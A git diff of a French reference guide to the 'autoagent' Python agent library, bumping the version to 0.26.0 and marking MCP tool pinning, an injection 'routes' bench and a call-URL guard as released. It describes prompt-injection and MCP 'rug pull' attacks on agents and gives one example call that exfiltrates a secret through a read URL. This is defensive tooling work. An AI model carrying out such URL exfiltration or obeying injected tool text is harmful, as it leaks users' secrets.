@@ -3,7 +3,7 @@
 > Référence technique complète pour intégrer, étendre et tester `autoagent` dans un projet Python.
 > **Public visé** : devs qui vont écrire des tools, brancher l'agent sur leur app, ou éventuellement contribuer à la lib.
 
-**Auteur** : Mohamed LAAZIZI · **Équipe** : Alyce R&D · **Version** : 2026-11-11 · **Couvre autoagent** : 0.25.0 (publié sur PyPI : [`autoagent-core`](https://pypi.org/project/autoagent-core/))
+**Auteur** : Mohamed LAAZIZI · **Équipe** : Alyce R&D · **Version** : 2026-11-11 · **Couvre autoagent** : 0.26.0 (publié sur PyPI : [`autoagent-core`](https://pypi.org/project/autoagent-core/))
 
 ---
 
@@ -2209,7 +2209,7 @@ Passe un `post_turn_hook` (§4.7) qui regarde `ctx.tool_calls` et retourne un `M
 
 ### Annexe A — Liste des fichiers de la lib
 
-*(vérifiée contre le disque sur `main` à la 0.25.0 — `autoagent/` : 35 modules + `__init__.py` ; `providers/` : 6 modules + `__init__.py`)*
+*(vérifiée contre le disque sur `main` à la 0.26.0 — `autoagent/` : 35 modules + `__init__.py` ; `providers/` : 6 modules + `__init__.py`)*
 
 ```
 autoagent/
@@ -2244,7 +2244,7 @@ autoagent/
 │                            # 0.18.0 — recall hybride BM25+RRF, forget_matching,
 │                            # bi-temporalité + provenance (§25, §26)
 ├── mcp.py                   # 0.11.0 — MCPClient (serveur MCP stdio → tools locaux, §17) ;
-│                            # main (non publié) — pin_tools / mount(pins=) : définitions épinglées (§17.1)
+│                            # 0.26.0 — pin_tools / mount(pins=) : définitions épinglées (§17.1)
 ├── otel.py                  # 0.11.0 — OTelTraceExporter ; 0.18.0 — semconv="gen_ai" (§18, §25.3)
 ├── replay.py                # 0.16.0 — RecordSession / ReplaySession (§23)
 ├── policy.py                # 0.18.0 — ToolPolicySpec : la politique d'outils en JSON (§26.2) ;
@@ -2269,7 +2269,7 @@ autoagent/
 ├── faults.py                # 0.24.0 — banc de pannes : FaultServer (vrai serveur HTTP local) + run_fault_bench (§42.2)
 ├── ws.py                    # 0.25.0 — client WebSocket synchrone RFC 6455, stdlib seule (§44)
 ├── output_guard.py          # 0.25.0 — OutputGuard / guard_output : la garde du canal de la réponse (§47) ;
-│                            # main (non publié) — guard_call_urls : la garde des URL d'appel, url_guard (§47.1)
+│                            # 0.26.0 — guard_call_urls : la garde des URL d'appel, url_guard (§47.1)
 └── providers/
     ├── __init__.py          # create_provider (fabrique par nom)
     ├── base.py              # LLMProvider (ABC) + deep-merge de config.extra_body ;
@@ -2369,13 +2369,13 @@ from autoagent.http import is_retryable_status               # 0.23.1 — quels 
 from autoagent.judge import audit_check, result_from, trivial_negatives     # 0.24.0 — auditer un juge (§42.4)
 from autoagent.redteam import (                              # 0.24.0 — le banc d'injection à canari (§42.1)
     DocileProvider, positive_control, run_injection_bench, standard_agent, injection_variant, injection_tasks, ATTACKS,
-    run_route_bench, positive_control_routes, RouteProvider, ROUTES,   # main (non publié) — le banc des routes
+    run_route_bench, positive_control_routes, RouteProvider, ROUTES,   # 0.26.0 — le banc des routes
 )
 from autoagent.faults import FaultServer, run_fault_bench, FAULT_CASES      # 0.24.0 — le banc de pannes (§42.2)
 from autoagent.ws import WebSocketClient, WebSocketClosed, WebSocketError   # 0.25.0 — WebSocket stdlib (§44)
-from autoagent.mcp import tool_fingerprint                                   # main (non publié) — empreinte d'un outil MCP (§17.1)
+from autoagent.mcp import tool_fingerprint                                   # 0.26.0 — empreinte d'un outil MCP (§17.1)
 from autoagent.output_guard import OutputGuard, guard_output                # 0.25.0 — garde du canal de la réponse (§47)
-from autoagent.output_guard import guard_call_urls                          # main (non publié) — garde des URL d'appel (§47.1)
+from autoagent.output_guard import guard_call_urls                          # 0.26.0 — garde des URL d'appel (§47.1)
 from autoagent.gate import delegation_taint                                 # 0.25.0 — la teinte qui descend (§46)
 ```
 
@@ -2812,9 +2812,9 @@ with MCPClient(["npx", "-y", "@modelcontextprotocol/server-filesystem", "."]) as
 | `call_tool(name, arguments, timeout=)` | 1 appel ; `structuredContent` renvoyé tel quel, sinon `{"text": ...}` |
 | `tools(include=, exclude=, prefix=, untrusted=, pins=)` | handlers portant `__autoagent_tool_spec__` (schéma = `inputSchema` du serveur) |
 | `mount(agent, include=, exclude=, prefix=, untrusted=, pins=)` | `add_tool` de chaque handler ; accepte aussi un `ToolRegistry` nu |
-| `fingerprints(include=, exclude=)` *(non publié)* | `{nom serveur: sha256}` des définitions sélectionnées |
-| `pin_tools(path, include=, exclude=)` *(non publié)* | écrit ces empreintes dans un fichier JSON à versionner avec le code |
-| `tool_fingerprint(tool_def)` *(non publié)* | l'empreinte d'UNE définition : JSON canonique sans `_meta`, sha256 |
+| `fingerprints(include=, exclude=)` *(0.26.0)* | `{nom serveur: sha256}` des définitions sélectionnées |
+| `pin_tools(path, include=, exclude=)` *(0.26.0)* | écrit ces empreintes dans un fichier JSON à versionner avec le code |
+| `tool_fingerprint(tool_def)` *(0.26.0)* | l'empreinte d'UNE définition : JSON canonique sans `_meta`, sha256 |
 | `server_info` / `server_capabilities` / `alive` | état après handshake |
 
 **Sémantique** :
@@ -2830,7 +2830,7 @@ with MCPClient(["npx", "-y", "@modelcontextprotocol/server-filesystem", "."]) as
 * `include`/`exclude` filtrent sur les noms CÔTÉ SERVEUR (avant `prefix`) —
   monter 3 outils précis vaut mieux que 40 (contexte + surface d'attaque).
 
-### 17.1 Épingler les définitions d'outils *(sur `main`, non publié)*
+### 17.1 Épingler les définitions d'outils *(0.26.0)*
 
 Un serveur MCP peut changer la description ou le schéma d'un outil APRÈS qu'on l'a relu et accepté
 (« rug pull ») : le modèle lit alors une consigne que personne n'a vue. OWASP Top 10 for Agentic Applications
@@ -5113,7 +5113,7 @@ le canari ne trouve que des fuites **littérales** (un secret paraphrasé passe)
 l'autre, ni d'une surface à l'autre (ici : le résultat d'un outil) ; et le niveau 1 ne dit **rien** de ce que fera un
 modèle réel. Un banc de non-régression et de comparaison, pas une certification.
 
-**Le banc des ROUTES** *(sur `main`, non publié)* — `run_route_bench(build_agent)`. Un attaquant ne s'arrête pas
+**Le banc des ROUTES** *(0.26.0)* — `run_route_bench(build_agent)`. Un attaquant ne s'arrête pas
 au premier refus : il prend un autre chemin. L'institut américain CAISI (NIST) le mesure sur AgentDojo : des attaques
 adaptées réussissent bien plus souvent que les attaques de référence (81 % contre 11 %, sur un seul modèle ; billet
 technique « Strengthening AI Agent Hijacking Evaluations », https://www.nist.gov/node/1872381, mis à jour le 19 déc.
@@ -5792,7 +5792,7 @@ sélection parmi des URL préparées par l'attaquant et présentes dans la page 
 `>` dans une valeur d'attribut entre guillemets coupe la balise (le reste passe par le filet des URL nues). **Pas
 mesuré** : le taux de faux positifs sur les réponses d'un vrai modèle — c'est pourquoi la garde reste opt-in.
 
-### 47.1 La garde des URL d'appel — `url_guard` *(sur `main`, non publié)*
+### 47.1 La garde des URL d'appel — `url_guard` *(0.26.0)*
 
 Lire une URL, c'est aussi écrire. `lire_page("https://collecte…/p.png?d=SECRET")` exfiltre comme un envoi, et un outil
 de lecture n'est pas `egress` : la garde trifecta ne le voit pas. Le banc des routes (§42.1) trouvait cette route
